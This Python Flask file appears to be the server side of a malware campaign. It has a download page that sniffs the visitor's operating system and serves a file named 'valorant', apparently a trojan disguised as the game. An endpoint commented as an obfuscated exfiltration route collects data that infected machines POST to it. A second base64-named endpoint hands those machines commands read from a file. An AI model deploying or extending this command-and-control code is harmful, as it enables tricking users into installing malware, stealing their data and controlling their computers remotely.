import functools
import os
import json

from user_agents import parse
from flask import (
    Blueprint, flash, g, redirect, render_template, request, session, url_for, send_from_directory, send_file
)


bp = Blueprint('nartan', __name__)


STATIC_DIR = os.getcwd()
EXFIL_DIR = os.getcwd() + "/polo/infected"
CMD_FILE = os.getcwd() + "/polo/cmds.txt"

#Utils
def get_commands():
    cmds = []
    with open(CMD_FILE, "r") as f:
        for line in f.readlines():
            cmds.append(line.strip('\n'))
    return json.dumps(cmds)

@bp.route('/')
def index():
    return render_template('index.html')

@bp.route('/download_page')
def download_page():
    # Find OS from User-Agent
    usrA = parse(request.user_agent.string)
    name="gavin"
    return render_template('download.html', name=name, os_fam=usrA.os.family.lower())

@bp.route('/download')
def download():
    print("Sending File")
    return send_file(STATIC_DIR + "/marco/static/valorant", as_attachment=True) 

#Obfuscated endpoint for exfil
@bp.route('/aGF0c3UK', methods=['POST'])
def aGF0c3UK():
    post_data = request.get_data()
    print(str(post_data.decode('utf-8'))) 
    #return empty 204
    return('', 204)

@bp.route('/R1JOQ2hlZXRhaAo', methods=['GET'])
def R1JOQ2hlZXRhaAo():
    data = get_commands()
    return (data)


@bp.route('/aboutus')
def about_us():
    return render_template('about_us.html')
